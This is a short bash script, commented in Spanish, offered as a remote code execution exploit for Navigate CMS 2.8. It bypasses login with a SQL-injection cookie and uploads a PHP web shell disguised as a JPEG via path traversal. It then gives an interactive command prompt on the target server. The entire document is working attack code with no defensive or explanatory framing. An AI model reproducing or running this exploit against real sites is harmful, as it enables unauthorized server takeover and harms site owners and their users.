#!/bin/bash
# script RCE navigator CMS 2.8 diseñado para PMJ - ed Octubre -  Alberto R.


url=$1         ## formato: sitio.com
sesion=$(curl -s -X POST  --url $url/navigate/login.php  -b 'navigate-user=\" OR TRUE--%20' -I |grep -E "302|NVSID" |grep Cookie |grep -oE "NVSID_+[a-z0-9]+=[0-9a-z]+;" |awk '{print $2}' FS='=' |head -1 |tr -d ';')

echo -e "\n URL:  http://$url/"
echo -e "\n Sesion: $sesion"
file="imagen.jpg"
echo -e "\nPayload:"
cat << EOF > $file
<?php system(\$_GET['cmd']);?>
EOF

cat $file

echo -e "\nSubiendo Exploit ..."
curl -X POST -H "Content-Type:multipart/form-data" -F "name=$file"  -F "session_id=$sesion"  -F "engine=picnik"  -F "id=../../../navigate_info.php"  -F "file=@$file" --url $url/navigate/navigate_upload.php
rm -rf $file

echo -e "\nObteniendo webshell..."
while true
do
	echo -n "webshell$ ";read cmd
	if [ "$cmd" = "exit" ];then
		echo -e "\n [+] Saliendo..."
		exit 1
	fi
	curl --url $url/navigate/navigate_info.php  --data-urlencode "cmd=$cmd" --get
done
